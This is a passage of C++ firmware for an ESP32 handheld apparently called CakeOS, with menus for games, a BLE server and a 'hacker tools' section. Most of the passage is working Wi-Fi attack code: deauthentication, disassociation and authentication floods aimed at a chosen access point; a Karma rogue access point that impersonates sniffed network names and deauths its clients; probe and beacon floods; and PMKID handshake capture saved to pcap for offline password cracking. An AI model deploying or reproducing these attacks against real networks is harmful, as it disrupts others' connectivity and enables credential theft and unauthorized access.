  client->disconnect(); NimBLEDevice::deleteClient(client); delay(100);
  NimBLEDevice::deinit(false); bleInited = false; delay(100);
}
static volatile bool g_bleCbConnected = false;
static volatile bool g_bleCbDisconnected = false;
static char g_bleCbName[32] = "";
class BleServerCB : public NimBLEServerCallbacks {
  void onConnect(NimBLEServer* srv, NimBLEConnInfo& connInfo) override { (void)srv; g_bleCbConnected = true;
    String addr = connInfo.getAddress().toString().c_str();
    strncpy(g_bleCbName, addr.c_str(), 31); g_bleCbName[31] = 0; }
  void onDisconnect(NimBLEServer* srv, NimBLEConnInfo& connInfo, int reason) override { (void)srv; (void)connInfo; (void)reason; g_bleCbDisconnected = true; }
};
void showBleBeConnected() {
  deinitWifi(); WiFi.disconnect(true); WiFi.mode(WIFI_OFF); delay(500);
  clearAll();
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("BLE Server", 2, 0);
  tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R2x:stop", 118, 0);
  NimBLEDevice::init("CakeOS"); bleInited = true;
  NimBLEServer* server = NimBLEDevice::createServer();
  server->setCallbacks(new BleServerCB());
  NimBLEService* svc = server->createService("FFE0");
  NimBLECharacteristic* ch = svc->createCharacteristic("FFE1", NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::WRITE | NIMBLE_PROPERTY::NOTIFY);
  ch->setValue("CakeOS"); svc->start();
  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
  adv->addServiceUUID("FFE0"); adv->setName("CakeOS5.3"); adv->enableScanResponse(true); adv->start();
  g_bleCbConnected = false; g_bleCbDisconnected = false;
  tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.drawString("Advertising...", 2, 16);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Name: CakeOS5.3", 2, 34); tft.drawString("Service: FFE0", 2, 46); tft.drawString("Char   : FFE1", 2, 58);
  tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("Waiting...", 2, 74);
  bool connected = false;
  while (true) {
    if (!connected && g_bleCbConnected) { connected = true;
      clearAll(); tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.drawString("Client Connected", 2, 0);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.drawString("Peer:", 2, 20); tft.drawString(g_bleCbName, 2, 34);
      tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R/E: stop", 2, 74); }
    if (g_bleCbDisconnected) { g_bleCbDisconnected = false; connected = false;
      clearAll(); tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString("Disconnected", 2, 0);
      tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Resuming adv...", 2, 20); adv->start(); }
    char k = getKey(); if (k == 'R' || k == 'E') break;
    delay(20);
  }
  adv->stop(); delay(50);
  if (server->getConnectedCount() > 0) {
    auto peers = server->getPeerDevices();
    for (auto& h : peers) { server->disconnect(h); delay(10); }
    int t = 0; while (server->getConnectedCount() > 0 && t++ < 100) delay(10);
  }
  delay(100); NimBLEDevice::deinit(true); bleInited = false;
}

// ==================================================
// ============== 菜单框架 ==============
// ==================================================
void drawGameMenu() {
  clearAll();
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Games", 2, 0);
  if (gameOffset > gameMenuCount - 4) gameOffset = gameMenuCount - 4;
  if (gameOffset < 0) gameOffset = 0;
  for (int i = gameOffset; i < gameOffset + 4 && i < gameMenuCount; i++) {
    int y = 12 + (i - gameOffset) * 17; bool sel = (i == selectedGame);
    if (sel) tft.fillRect(0, y - 1, 160, 17, 0x0010);
    uint16_t iconColor = sel ? TFT_YELLOW : TFT_CYAN;
    drawAppIcon(3, y + 1, gameIcons[i], iconColor);
    tft.setTextColor(sel ? TFT_YELLOW : TFT_WHITE, sel ? 0x0010 : TFT_BLACK);
    tft.drawString((sel ? "> " : "  ") + String(gameMenu[i]), 20, y + 3);
  }
}
void drawHackMenu() {
  clearAll();
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Tools", 2, 0);
  lastWifiDisplay = -1; updateWifiStatusBar();
  if (hackOffset > hackMenuCount - 4) hackOffset = hackMenuCount - 4;
  if (hackOffset < 0) hackOffset = 0;
  for (int i = hackOffset; i < hackOffset + 4 && i < hackMenuCount; i++) {
    int y = 12 + (i - hackOffset) * 17; bool sel = (i == selectedHack);
    if (sel) tft.fillRect(0, y - 1, 160, 17, 0x0010);
    uint16_t iconColor = sel ? TFT_YELLOW : TFT_CYAN;
    drawAppIcon(3, y + 1, hackIcons[i], iconColor);
    tft.setTextColor(sel ? TFT_YELLOW : TFT_WHITE, sel ? 0x0010 : TFT_BLACK);
    tft.drawString((sel ? "> " : "  ") + String(hackMenu[i]), 20, y + 3);
  }
}
void showGameMenu() {
  while (true) {
    drawGameMenu();
    char k = getKey();
    if (k == 'U') { selectedGame--; if (selectedGame < 0) selectedGame = gameMenuCount - 1; }
    else if (k == 'D') { selectedGame++; if (selectedGame >= gameMenuCount) selectedGame = 0; }
    else if (k == 'L') {
      g_curGameIdx = selectedGame;
      switch (selectedGame) {
        case 0: showTetris(); break;
        case 1: showBreakout(); break;
        case 2: showSnake(); break;
        case 3: showDinoRun(); break;
        case 4: showFlappyBird(); break;
        case 5: show2048(); break;
        case 6: showMinesweeper(); break;
        case 7: showRoguelike(); break;
        case 8: showJump(); break;
        case 9: showTowerDef(); break;
        case 10: showGomoku(); break;
        case 11: showGameKeySetting(); break;
      }
      continue;
    } else if (k == 'R' || k == 'E') return;
    if (selectedGame < gameOffset) gameOffset = selectedGame;
    if (selectedGame >= gameOffset + 4) gameOffset = selectedGame - 3;
    delay(20);
  }
}
void showHackerMenu() {
  while (true) {
    drawHackMenu();
    if (millis() - lastWifiCheck > 500) { lastWifiCheck = millis(); updateWifiStatusBar(); }
    char k = getKey();
    if (k == 'U') { selectedHack--; if (selectedHack < 0) selectedHack = hackMenuCount - 1; }
    else if (k == 'D') { selectedHack++; if (selectedHack >= hackMenuCount) selectedHack = 0; }
    else if (k == 'L') {
      switch (selectedHack) {
        case 0: showWifiConnect(); break;
        case 1: showIPScan(); break;
        case 2: showDeauth(); break;
        case 3: showKarma(); break;
        case 4: showProbeFlood(); break;
        case 5: showBeaconFlood(); break;
        case 6: showPMKID(); break;
        case 7: showSniffer(); break;
        case 8: showKeyEncoder(); break;
        case 9: showDeviceTracker(); break;
        case 10: showBLEScan(); break;
        case 11: showBLESpam(); break;
        case 12: showChanGraph(); break;
        case 13: showBleGatt(); break;
        case 14: showTrackerDetect(); break;
        case 15: showBleConnect(); break;
        case 16: showBleBeConnected(); break;
        case 17: showHackSettings(); break;
      }
      if (wifiConfigured) restartWifi();
      continue;
    } else if (k == 'R' || k == 'E') return;
    if (selectedHack < hackOffset) hackOffset = selectedHack;
    if (selectedHack >= hackOffset + 4) hackOffset = selectedHack - 3;
    delay(20);
  }
}
void showToolsMenu() {
  deinitWifi(); deinitBLE();
  int sel = 0; const int ITEM_COUNT = 3;
  const char* items[] = {"Terminal", "BASIC", "Settings"};
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Tools", 2, 0);
    for (int i = 0; i < ITEM_COUNT; i++) {
      int y = 22 + i * 16; bool s = (i == sel);
      if (s) tft.fillRect(0, y - 1, 160, 16, 0x0010);
      uint16_t iconColor = s ? TFT_YELLOW : TFT_CYAN;
      drawAppIcon(3, y + 1, toolsIcons[i], iconColor);
      tft.setTextColor(s ? TFT_YELLOW : TFT_WHITE, s ? 0x0010 : TFT_BLACK);
      tft.drawString((s ? "> " : "  ") + String(items[i]), 20, y + 3);
    }
    char k = getKey();
    if (k == 'U') sel = (sel + ITEM_COUNT - 1) % ITEM_COUNT;
    else if (k == 'D') sel = (sel + 1) % ITEM_COUNT;
    else if (k == 'L') {
      if (sel == 0) showTerminal();
      else if (sel == 1) showBasic();
      else if (sel == 2) showToolsSettings();
    } else if (k == 'R' || k == 'E') return;
    delay(30);
  }
}

// ==================================================
// ============== Hack 日志基础设施 ==============
// ==================================================
#define HACKLOG_FILE "/hacklog.txt"
void hackLogClear() { ensureLittleFS(); if (LittleFS.exists(HACKLOG_FILE)) LittleFS.remove(HACKLOG_FILE); }
void hackLogAppend(const char* line) { ensureLittleFS(); File f = LittleFS.open(HACKLOG_FILE, "a"); if (f) { f.println(line); f.close(); } }
void hackLogSection(const char* title) {
  ensureLittleFS(); File f = LittleFS.open(HACKLOG_FILE, "a");
  if (f) { f.println(); f.print("=== "); f.print(title); f.print(" @"); f.print(millis()/1000); f.println("s ==="); f.close(); }
}
size_t hackLogSize() { ensureLittleFS(); if (!LittleFS.exists(HACKLOG_FILE)) return 0; File f = LittleFS.open(HACKLOG_FILE, "r"); size_t s = f ? f.size() : 0; if (f) f.close(); return s; }
bool promptSaveLog() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawCentreString("Save Log?", 80, 18, 1);
  tft.drawFastHLine(20, 30, 120, TFT_DARKGREY);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawCentreString("Write this session", 80, 36, 1);
  tft.drawCentreString("to /hacklog.txt ?", 80, 48, 1);
  tft.fillRoundRect(14, 62, 60, 12, 3, 0x0400);
  tft.drawRoundRect(14, 62, 60, 12, 3, TFT_GREEN);
  tft.setTextColor(TFT_GREEN, 0x0400);
  tft.drawCentreString("L  YES", 44, 65, 1);
  tft.fillRoundRect(86, 62, 60, 12, 3, 0x4000);
  tft.drawRoundRect(86, 62, 60, 12, 3, TFT_RED);
  tft.setTextColor(TFT_RED, 0x4000);
  tft.drawCentreString("R  NO", 116, 65, 1);
  while (true) {
    if (digitalRead(BTN_LEFT) == LOW) { delay(20); if (digitalRead(BTN_LEFT) == LOW) { while (digitalRead(BTN_LEFT) == LOW) delay(5); return true; } }
    if (digitalRead(BTN_RIGHT) == LOW) { delay(20); if (digitalRead(BTN_RIGHT) == LOW) { while (digitalRead(BTN_RIGHT) == LOW) delay(5); return false; } }
    delay(20);
  }
}
void hackSaveToast() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.drawCentreString("[ OK ]", 80, 20, 1);
  tft.fillCircle(80, 44, 12, TFT_GREEN);
  tft.drawLine(74, 44, 78, 49, TFT_BLACK); tft.drawLine(78, 49, 87, 39, TFT_BLACK);
  tft.drawLine(75, 44, 78, 48, TFT_BLACK); tft.drawLine(78, 48, 87, 38, TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawCentreString("Log saved", 80, 62, 1);
  delay(800);
}

// ==================================================
// ============== 黑客工具 ==============
// ==================================================
void showIPScan() {
  if (WiFi.status() != WL_CONNECTED) { clearAll(); titleBar("No WiFi"); tft.drawString("Connect first", 2, 20); delay(1500); return; }
  clearAll(); titleBar("Scanning...");
  IPAddress gw = WiFi.gatewayIP(); IPAddress myIP = WiFi.localIP();
  IPAddress foundIPs[20]; int foundCount = 0;
  for (int i = 1; i < 255 && foundCount < 20; i++) {
    IPAddress target(gw[0],gw[1],gw[2],i); if (target == myIP) continue;
    WiFiClient client;
    if (client.connect(target, 80, 50) || client.connect(target, 443, 50)) { foundIPs[foundCount++] = target; client.stop(); }
  }
  if (foundCount == 0) { clearAll(); titleBar("No devices"); tft.drawString("GW:" + gw.toString(), 2, 14); waitExit(); return; }
  int sel = 0, off = 0;
  while (true) {
    clearAll(); titleBar("IP Devices"); tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R:save R2x:exit", 96, 0); tft.setTextColor(TFT_WHITE, TFT_BLACK);
    if (sel < off) off = sel; if (sel >= off + 4) off = sel - 3;
    for (int i = 0; i < 4 && off + i < foundCount; i++) { int idx = off + i; tft.drawString(((idx==sel)?"> ":"  ") + foundIPs[idx].toString(), 2, 14 + i*12); }
    char k = getKey();
    if (k=='U') { sel--; if (sel<0) sel=foundCount-1; }
    else if (k=='D') { sel++; if (sel>=foundCount) sel=0; }
    else if (k=='R') { if (promptSaveLog()) { hackLogSection("IP Scan"); for (int i = 0; i < foundCount; i++) hackLogAppend(foundIPs[i].toString().c_str()); hackSaveToast(); } }
    else if (k=='E') break;
    delay(20);
  }
}
void sendDeauthTargeted(uint8_t* bssid, uint8_t ch) {
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  uint8_t d[26]={0xC0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0x07,0x00};
  memcpy(d+10,bssid,6); memcpy(d+16,bssid,6);
  uint8_t dis[26]={0xA0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0x01,0x00};
  memcpy(dis+10,bssid,6); memcpy(dis+16,bssid,6);
  for (int i=0;i<10;i++) esp_wifi_80211_tx(WIFI_IF_STA,d,sizeof(d),false);
  for (int i=0;i<10;i++) esp_wifi_80211_tx(WIFI_IF_STA,dis,sizeof(dis),false);
}
void sendAuthFlood(uint8_t* bssid, uint8_t ch) {
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  uint8_t auth[30]={0xB0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0,0};
  memcpy(auth+4,bssid,6); memcpy(auth+10,bssid,6); memcpy(auth+16,bssid,6);
  for (int i=0;i<10;i++) { auth[13]=random(256); auth[14]=random(256); auth[15]=random(256); esp_wifi_80211_tx(WIFI_IF_STA,auth,sizeof(auth),false); }
}
void showDeauth() {
  clearAll(); titleBar("Scanning..."); WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks();
  if (!n) { titleBar("No AP"); delay(1000); return; }
  int sel = 0, off = 0;
  while (true) {
    clearAll(); titleBar("Select AP");
    if (sel < off) off = sel; if (sel >= off + 4) off = sel - 3;
    for (int i = 0; i < 4 && off + i < n; i++) { int idx = off + i; tft.drawString(((idx==sel)?"> ":"  ") + WiFi.SSID(idx).substring(0,14), 2, 14 + i*12); }
    char k = getKey();
    if (k=='U') { sel--; if (sel<0) sel=n-1; }
    else if (k=='D') { sel++; if (sel>=n) sel=0; }
    else if (k=='L') break;
    else if (k=='R'||k=='E') return;
    delay(20);
  }
  uint8_t bssid[6]; memcpy(bssid, WiFi.BSSID(sel), 6);
  uint8_t ch = WiFi.channel(sel); String ssid = WiFi.SSID(sel);
  int mode = 0;
  while (true) {
    clearAll(); titleBar("Attack Mode");
    tft.drawString(ssid.substring(0,12), 2, 14);
    const char* modes[] = {"Deauth+Dis","Auth Flood","Mixed"};
    for (int i = 0; i < 3; i++) tft.drawString(((i==mode)?"> ":"  ") + String(modes[i]), 2, 30 + i*12);
    char k = getKey();
    if (k=='U') mode=(mode+2)%3; else if (k=='D') mode=(mode+1)%3;
    else if (k=='L') break; else if (k=='R'||k=='E') return;
    delay(20);
  }
  clearAll(); titleBar("Attack Running");
  tft.drawString(ssid.substring(0,12), 2, 16);
  tft.drawString(mode==0?"Deauth":(mode==1?"Auth":"Mixed"), 2, 28);
  initRawWifi(); int cnt = 0;
  while (true) {
    if (mode==0||mode==2) sendDeauthTargeted(bssid, ch);
    if (mode==1||mode==2) sendAuthFlood(bssid, ch);
    cnt++;
    if (cnt % 10 == 0) { tft.fillRect(0,48,160,20,TFT_BLACK); tft.drawString("Rounds:"+String(cnt),2,48); int pkts=(mode==0)?cnt*20:(mode==1?cnt*10:cnt*30); tft.drawString("Pkts:"+String(pkts),2,60); }
    char k = getKey();
    if (k=='R') {
      if (promptSaveLog()) {
        char buf[64];
        hackLogSection("Deauth Attack");
        snprintf(buf, sizeof(buf), "Target: %s", ssid.c_str()); hackLogAppend(buf);
        snprintf(buf, sizeof(buf), "Mode  : %s", mode==0?"Deauth":(mode==1?"Auth":"Mixed")); hackLogAppend(buf);
        snprintf(buf, sizeof(buf), "Rounds: %d", cnt); hackLogAppend(buf);
        int pkts=(mode==0)?cnt*20:(mode==1?cnt*10:cnt*30);
        snprintf(buf, sizeof(buf), "Pkts  : %d", pkts); hackLogAppend(buf);
        hackSaveToast();
      }
      clearAll(); titleBar("Attack Running");
      tft.drawString(ssid.substring(0,12), 2, 16);
      tft.drawString(mode==0?"Deauth":(mode==1?"Auth":"Mixed"), 2, 28);
    }
    else if (k=='E') break;
    delay(0);
  }
  delay(150); deinitWifi(); delay(150);
}
void showKarma() {
  clearAll(); titleBar("Karma+"); tft.drawString("Listening 15s...", 2, 20);
  deinitWifi(); WiFi.mode(WIFI_STA); WiFi.disconnect();
  esp_wifi_set_promiscuous_rx_cb(snifferCallback); esp_wifi_set_promiscuous(true);
  sniffCount = 0; sniffRunning = true;
  unsigned long start = millis(); int lastRefresh = 0;
  while (millis() - start < 15000) {
    if (millis() - lastRefresh > 500) { lastRefresh = millis();
      char buf[24]; snprintf(buf,sizeof(buf),"SSIDs: %d",sniffCount);
      tft.fillRect(0,20,160,20,TFT_BLACK); tft.drawString(buf,2,20);
      tft.drawString("Sec:"+String((millis()-start)/1000),2,32); }
    delay(50);
  }
  sniffRunning = false; esp_wifi_set_promiscuous(false);
  if (sniffCount == 0) { clearAll(); titleBar("Karma+"); tft.drawString("No SSIDs",2,30); waitExit(); return; }
  int sel=0, off=0;
  while (true) {
    clearAll(); titleBar("Karma: Select"); tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R:save R2x:exit", 96, 0); tft.setTextColor(TFT_WHITE, TFT_BLACK);
    if (sel<off) off=sel; if (sel>=off+4) off=sel-3;
    for (int i=0;i<4&&off+i<sniffCount;i++){int idx=off+i;tft.drawString(((idx==sel)?"> ":"  ")+String(sniffList[idx].ssid).substring(0,14),2,14+i*12);}
    char k=getKey();
    if (k=='U'){sel--;if(sel<0)sel=sniffCount-1;} else if (k=='D'){sel++;if(sel>=sniffCount)sel=0;}
    else if (k=='R') { if (promptSaveLog()) { hackLogSection("Karma Captured SSIDs"); for (int i = 0; i < sniffCount; i++) hackLogAppend(sniffList[i].ssid); hackSaveToast(); } }
    else if (k=='L') break; else if (k=='E') return;
    delay(20);
  }
  String targetSSID = String(sniffList[sel].ssid);
  clearAll(); titleBar("Karma Active");
  tft.drawString("SSID:",2,20); tft.drawString(targetSSID.substring(0,20),2,32);
  WiFi.mode(WIFI_AP); WiFi.softAP(targetSSID.c_str(), nullptr);
  tft.drawString("IP:"+WiFi.softAPIP().toString(),2,46); tft.drawString("Clients:0",2,60);
  int clients=0; unsigned long lastCount=0, lastDeauth=0;
  while (true) {
    if (millis()-lastCount>1000){lastCount=millis();int c=WiFi.softAPgetStationNum();if(c!=clients){clients=c;tft.fillRect(0,60,160,10,TFT_BLACK);tft.drawString("Clients:"+String(clients),2,60);}}
    if (clients>0 && millis()-lastDeauth>5000){lastDeauth=millis();uint8_t broad[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};uint8_t deauth[26]={0xC0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0x07,0x00};memcpy(deauth+10,broad,6);memcpy(deauth+16,broad,6);for(int i=0;i<10;i++)esp_wifi_80211_tx(WIFI_IF_AP,deauth,sizeof(deauth),false);}
    char k=getKey();
    if (k=='R') {
      if (promptSaveLog()) {
        char buf[64];
        hackLogSection("Karma AP");
        snprintf(buf, sizeof(buf), "SSID: %s", targetSSID.c_str()); hackLogAppend(buf);
        snprintf(buf, sizeof(buf), "Clients: %d", clients); hackLogAppend(buf);
        hackSaveToast();
        clearAll(); titleBar("Karma Active");
        tft.drawString("SSID:",2,20); tft.drawString(targetSSID.substring(0,20),2,32);
        tft.drawString("IP:"+WiFi.softAPIP().toString(),2,46); tft.drawString("Clients:"+String(clients),2,60);
      }
    }
    else if (k=='E') break;
    delay(20);
  }
  WiFi.softAPdisconnect(true); delay(150); deinitWifi(); delay(150);
}
void sendProbe(const char* ssid) {
  uint8_t f[80]={0x40,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0};
  f[10]=random(256);f[11]=random(256);f[12]=random(256);f[13]=random(256);f[14]=random(256);f[15]=random(256);
  size_t len=strlen(ssid); if (len>32) len=32;
  f[24]=0x00; f[25]=len; memcpy(&f[26],ssid,len);
  esp_wifi_80211_tx(WIFI_IF_STA,f,26+len,false);
}
void showProbeFlood() {
  clearAll(); titleBar("Probe Flood+"); tft.drawString("Sending...", 2, 20);
  initRawWifi();
  const char* fake[]={"FreeWiFi","Home","Guest","TP-LINK","ChinaNet","CMCC","Starbucks","Airport","Hotel","Office","iPhone","AndroidAP"};
  int cnt=0;
  while (true) {
    for (int i=0;i<20;i++){sendProbe(fake[random(0,12)]);cnt++;}
    if (cnt%1000==0){tft.fillRect(0,40,160,20,TFT_BLACK);tft.drawString("Pkts:"+String(cnt),2,40);}
    char k=getKey(); if (k=='R'||k=='E') break;
    delay(0);
  }
  delay(150); deinitWifi(); delay(150);
}
void sendBeacon(const char* ssid, uint8_t ch) {
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  uint8_t b[128]={0x80,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0x64,0,0x31,0x04,0,0};
  for (int i=0;i<6;i++){uint8_t m=random(256);b[10+i]=m;b[16+i]=m;}
  size_t len=strlen(ssid); if (len>32) len=32;
  b[37]=len; memcpy(&b[38],ssid,len);
  esp_wifi_80211_tx(WIFI_IF_AP,b,38+len,false);
}
void showBeaconFlood() {
  clearAll(); titleBar("Beacon Flood+");
  tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R2x:exit", 110, 0);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Sending...", 2, 20);
  initRawWifi();
  const char* names[]={"FreeWiFi","CMCC","ChinaNet","Starbucks","Airport_Free","TP-LINK","MERCURY","HUAWEI","Xiaomi","iPhone","AndroidAP","NETGEAR"};
  uint8_t channels[]={1,6,11}; int chIdx=0; unsigned long lastChSwitch=millis(); int cnt=0;
  bool exitFlag=false;
  while (!exitFlag) {
    if (millis()-lastChSwitch>1500){lastChSwitch=millis();chIdx=(chIdx+1)%3;esp_wifi_set_channel(channels[chIdx],WIFI_SECOND_CHAN_NONE);}
    for (int i=0;i<50;i++){String s=names[random(0,12)];sendBeacon(s.c_str(),channels[chIdx]);cnt++;}
    if (cnt%500==0){tft.fillRect(0,40,160,20,TFT_BLACK);tft.setTextColor(TFT_WHITE,TFT_BLACK);tft.drawString("B:"+String(cnt),2,40);tft.drawString("ch"+String(channels[chIdx]),2,52);}
    char k=getKey(); if (k=='R'||k=='E') exitFlag=true;
    delay(0);
  }
  delay(150); deinitWifi(); delay(150);
}
volatile bool pmkidRunning = false;
volatile uint32_t pmkidPkts = 0;
File pmkidFile;
void pmkidCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!pmkidRunning) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  int len = pkt->rx_ctrl.sig_len; if (len < 24) return;
  uint8_t* p = pkt->payload;
  uint8_t fc = p[0]; uint8_t ftype = (fc >> 2) & 0x03; uint8_t sub = (fc >> 4) & 0x0F;
  bool save = false;
  if (ftype==0x00 && (sub==1||sub==3)) save=true;
  if (ftype==0x02) save=true;
  if (save && pmkidFile) { pmkidFile.write(pkt->payload, len); pmkidPkts++; }
}
void showPMKID() {
  clearAll(); titleBar("PMKID+"); tft.drawString("Scanning...", 2, 20);
  WiFi.mode(WIFI_STA); int n = WiFi.scanNetworks();
  if (!n) { titleBar("No AP"); delay(1000); return; }
  int sel=0, off=0;
  while (true) {
    clearAll(); titleBar("Select AP");
    if (sel<off) off=sel; if (sel>=off+4) off=sel-3;
    for (int i=0;i<4&&off+i<n;i++){int idx=off+i;tft.drawString(((idx==sel)?"> ":"  ")+WiFi.SSID(idx).substring(0,14),2,14+i*12);}
    char k=getKey();
    if (k=='U'){sel--;if(sel<0)sel=n-1;} else if (k=='D'){sel++;if(sel>=n)sel=0;}
    else if (k=='L') break; else if (k=='R'||k=='E') return;
    delay(20);
  }
  uint8_t bssid[6]; memcpy(bssid, WiFi.BSSID(sel), 6);
  uint8_t ch = WiFi.channel(sel); String ssid = WiFi.SSID(sel);
  clearAll(); titleBar("PMKID+");
  tft.drawString(ssid.substring(0,12),2,16); tft.drawString("Capturing...",2,30);
  ensureLittleFS();
  String fn = "/pmkid_" + String(millis()) + ".pcap";
  pmkidFile = LittleFS.open(fn, "w");
  if (pmkidFile) { uint8_t hdr[24]={0xD4,0xC3,0xB2,0xA1,0x02,0,0x04,0,0,0,0,0,0,0,0,0,0xFF,0xFF,0,0,0x69,0,0,0}; pmkidFile.write(hdr,24); }
  initRawWifi(); esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous_rx_cb(pmkidCallback); esp_wifi_set_promiscuous(true);
  pmkidRunning=true; pmkidPkts=0;
  uint8_t assoc[30]={0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0,0};
  memcpy(assoc+4,bssid,6); memcpy(assoc+10,bssid,6); memcpy(assoc+16,bssid,6);
  uint8_t deauth[26]={0xC0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0x07,0x00};
  memcpy(deauth+10,bssid,6); memcpy(deauth+16,bssid,6);
  unsigned long start = millis(); int round = 0;
  while (millis() - start < 45000) {
    round++;
    for (int i=0;i<5;i++) esp_wifi_80211_tx(WIFI_IF_STA,assoc,sizeof(assoc),false); delay(30);
    for (int i=0;i<5;i++) esp_wifi_80211_tx(WIFI_IF_STA,deauth,sizeof(deauth),false); delay(80);
    if (round%10==0){tft.fillRect(0,44,160,20,TFT_BLACK);tft.drawString("Pkts:"+String(pmkidPkts),2,44);tft.drawString("Sec:"+String((millis()-start)/1000),2,56);}
    char k=getKey();
    if (k=='R') { if (promptSaveLog()) {
      char buf[64]; hackLogSection("PMKID Capture");
      snprintf(buf, sizeof(buf), "Target: %s", ssid.c_str()); hackLogAppend(buf);
      snprintf(buf, sizeof(buf), "File  : %s", fn.c_str()); hackLogAppend(buf);
      snprintf(buf, sizeof(buf), "Pkts  : %u", (unsigned)pmkidPkts); hackLogAppend(buf);
      hackSaveToast(); } }
    else if (k=='E') break;
  }
  pmkidRunning=false; esp_wifi_set_promiscuous(false);
  if (pmkidFile) pmkidFile.close();
  clearAll(); titleBar("PMKID Done");
  tft.drawString("Captured:",2,20); tft.drawString(String(pmkidPkts)+" frames",2,32);
  tft.setTextColor(TFT_DARKGREY,TFT_BLACK); tft.drawString("File: " + fn, 2, 46);
  tft.setTextColor(TFT_WHITE,TFT_BLACK);
  delay(150); deinitWifi(); delay(150); waitExit();
}
void showSniffer() {
  deinitWifi();
  clearAll(); titleBar("Sniffer"); tft.drawString("Listening...", 2, 20);
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  esp_wifi_set_promiscuous_rx_cb(snifferCallback); esp_wifi_set_promiscuous(true);
  sniffCount=0; sniffRunning=true;
  int sel=0, off=0; unsigned long lastRefresh=millis();
  while (true) {
    if (millis()-lastRefresh>500){lastRefresh=millis();clearAll();
      char t[24]; snprintf(t,sizeof(t),"Sniff: %d",sniffCount); titleBar(t);
      tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("R:save R2x:exit", 96, 0); tft.setTextColor(TFT_WHITE, TFT_BLACK);
      if (sel<off) off=sel; if (sel>=off+4) off=sel-3;
      for (int i=0;i<4&&off+i<sniffCount;i++){int idx=off+i;tft.drawString(((idx==sel)?"> ":"  ")+String(sniffList[idx].ssid).substring(0,14),2,14+i*12);}}
    char k=getKey();
    if (k=='U'){if(sniffCount>0){sel--;if(sel<0)sel=sniffCount-1;}}
    else if (k=='D'){if(sniffCount>0){sel++;if(sel>=sniffCount)sel=0;}}
    else if (k=='R') { if (promptSaveLog()) {
      char buf[80]; hackLogSection("Sniffer Capture");
      for (int i = 0; i < sniffCount; i++) {
        snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X  %-20s  %d",
          sniffList[i].mac[0],sniffList[i].mac[1],sniffList[i].mac[2],
          sniffList[i].mac[3],sniffList[i].mac[4],sniffList[i].mac[5],
          sniffList[i].ssid, sniffList[i].rssi);
        hackLogAppend(buf);
      }
      hackSaveToast(); } }
    else if (k=='E') break;
    delay(20);
  }
  sniffRunning=false; esp_wifi_set_promiscuous(false);
  delay(150); deinitWifi(); delay(150);
}
// ===== Key Encoder（★ 单击 RIGHT = 保存日志，双击 RIGHT = 退出） =====
enum KeyState { KS_EDIT, KS_MODEL_MENU, KS_EXPORTED };
KeyState keyState = KS_EDIT;
int keySelectedTooth = 0, keyModelMenuSel = 0, keyExportSum = 0;
bool keyNeedsRedraw = true;
void drawKeyEditScreen() {
  clearAll();
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Key Encoder", 2, 0);
  char mb[16]; snprintf(mb, sizeof(mb), "%s [>]", MODELS[keyModel].name);
